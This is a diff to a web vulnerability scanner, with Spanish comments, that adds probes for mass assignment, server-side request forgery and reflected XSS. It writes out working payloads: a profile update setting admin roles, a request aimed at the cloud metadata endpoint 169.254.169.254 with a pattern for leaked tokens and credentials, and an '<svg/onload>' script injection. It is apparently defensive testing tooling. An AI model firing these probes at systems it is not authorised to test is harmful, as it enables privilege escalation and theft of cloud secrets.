@@ -15,6 +15,11 @@ const ID_PARAM = /^(id|.*_id|.*Id)$/;
 const REDIRECT_PARAMS = ['to', 'url', 'next', 'redirect', 'return', 'returnUrl', 'dest'];
 const SQL_PARAMS = ['q', 'search', 'query', 'filter', 's', 'term', 'name'];
 const SQL_ERR = /syntax|unterminated|unclosed|SQLITE_|near "|pg_|mysql|ORA-|SQL|\b42\d{3}\b/i;
+const PROFILE_ROUTE = /users?\/me|\/profile|\/account|\/me$/;
+const SSRF_PARAMS = ['url', 'uri', 'link', 'fetch', 'image', 'img', 'callback', 'webhook', 'target', 'dest', 'host', 'next'];
+const SSRF_INTERNAL = 'http://169.254.169.254/latest/meta-data/';
+const SSRF_LEAK = /secret|aws_|token|credential|meta-data|private[_-]?key/i;
+const XSS_PARAMS = ['q', 'search', 'query', 'name', 'msg', 'message', 's', 'term', 'redirect'];
 
 export async function runGenericSuite(
   target: TargetConfig,
@@ -42,6 +47,9 @@ export async function runGenericSuite(
   await rateLimit();
   await missingAuthz();
   await openRedirect();
+  await massAssignment();
+  await ssrf();
+  await reflectedXss();
   return out;
 
   // ---- IDOR: rutas con param de id bajo auth → ¿una identidad ve dueños distintos?
@@ -126,6 +134,61 @@ export async function runGenericSuite(
           out.push({ vuln_class: 'open-redirect', confirmed: true, where: refOf(r), source: 'generic',
             evidence: `${r.path}?${param}= redirige a ${evil}` });
           log(`  [A] open-redirect en ${r.path}`);
+          return;
+        }
+      }
+    }
+  }
+
+  // ---- Mass assignment: ruta de perfil que acepta un campo privilegiado (role/admin).
+  async function massAssignment() {
+    if (!token) return;
+    const routes = repo.routes.filter((r) => (r.method === 'PATCH' || r.method === 'PUT' || r.method === 'POST') && PROFILE_ROUTE.test(r.path) && r.auth);
+    for (const r of routes) {
+      const res = await http.request({ method: r.method, path: r.path, token, body: { name: 'rt', role: 'admin', is_admin: true, admin: true, isAdmin: true } });
+      const b = (res.json ?? {}) as any;
+      const escalated = res.status < 400 && (b.role === 'admin' || b.is_admin === true || b.isAdmin === true || b.admin === true);
+      if (escalated) {
+        out.push({ vuln_class: 'mass-assignment', confirmed: true, where: refOf(r), source: 'generic',
+          evidence: `${r.method} ${r.path} aceptó un campo privilegiado y escaló el perfil a admin` });
+        log(`  [A] mass-assignment en ${r.path}`);
+        await http.request({ method: r.method, path: r.path, token, body: { role: 'user' } }); // revertir
+        break;
+      }
+    }
+  }
+
+  // ---- SSRF: ruta con param de URL → el servidor hace fetch de un destino interno.
+  async function ssrf() {
+    const routes = repo.routes.filter((r) => r.method === 'GET' || r.method === 'POST');
+    for (const r of routes) {
+      for (const param of SSRF_PARAMS) {
+        const res = r.method === 'GET'
+          ? await http.get(`${r.path}?${param}=${encodeURIComponent(SSRF_INTERNAL)}`, token ? { token } : {})
+          : await http.request({ method: 'POST', path: r.path, body: { [param]: SSRF_INTERNAL }, ...(token ? { token } : {}) });
+        if (res.status < 400 && SSRF_LEAK.test(res.text)) {
+          out.push({ vuln_class: 'ssrf-secrets', confirmed: true, where: refOf(r), source: 'generic',
+            evidence: `${r.method} ${r.path} (param ${param}) hizo fetch de ${SSRF_INTERNAL} y filtró datos internos` });
+          log(`  [A] ssrf en ${r.path}`);
+          return;
+        }
+      }
+    }
+  }
+
+  // ---- Reflected XSS: payload en un query param reflejado SIN escapar en HTML.
+  async function reflectedXss() {
+    const marker = `xss${Math.floor(rng() * 1e6)}`;
+    const payload = `<svg/onload=alert(1)>${marker}`;
+    const routes = repo.routes.filter((r) => r.method === 'GET');
+    for (const r of routes) {
+      for (const param of XSS_PARAMS) {
+        const res = await http.get(`${r.path}?${param}=${encodeURIComponent(payload)}`, token ? { token } : {});
+        const ct = res.headers['content-type'] ?? '';
+        if (/html/.test(ct) && res.text.includes(payload)) {
+          out.push({ vuln_class: 'reflected-xss', confirmed: true, where: refOf(r), source: 'generic',
+            evidence: `${r.path}?${param}= reflejó el payload <svg onload> sin escapar` });
+          log(`  [A] reflected-xss en ${r.path}`);
           return;
         }
       }
